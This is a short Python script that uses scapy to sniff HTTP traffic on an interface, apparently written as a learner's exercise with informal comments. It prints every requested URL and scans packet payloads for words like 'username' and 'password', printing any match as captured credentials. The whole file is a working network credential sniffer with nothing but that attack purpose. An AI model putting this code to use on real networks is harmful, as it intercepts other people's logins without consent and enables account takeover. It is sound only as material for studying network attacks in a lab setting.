#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # store = false  means not save my computer just write screen , prn = recursive function after to catched data


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # to show username password
        # print(packet.show())            #to show all layer by layer  if not  upside line
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "Password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # to use filter
        url = get_url(packet)  # to show link

        print("[+] HTTP Request >>" + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " +
                  str(login_info) + "\n\n")


sniff("eth0")
